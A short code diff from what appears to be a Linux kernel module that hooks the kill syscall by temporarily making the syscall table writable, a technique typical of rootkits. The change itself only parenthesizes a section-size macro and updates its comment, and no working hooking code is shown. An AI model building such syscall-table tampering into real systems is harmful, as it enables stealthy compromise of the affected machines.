@@ -107,8 +107,9 @@ void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t si
 unsigned long start_rodata;
 unsigned long init_begin;
 // Size of the read-only data section. Used to temporarily make the syscall table writable.
-// Parentheses omitted intentionally — macro is only used in a single-argument context.
-#define section_size init_begin - start_rodata
+// Parenthesized so the subtraction stays atomic if this macro is ever combined
+// with another operator at a future call site (e.g. `section_size * 2`).
+#define section_size (init_begin - start_rodata)
 
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 static t_syscall orig_kill;
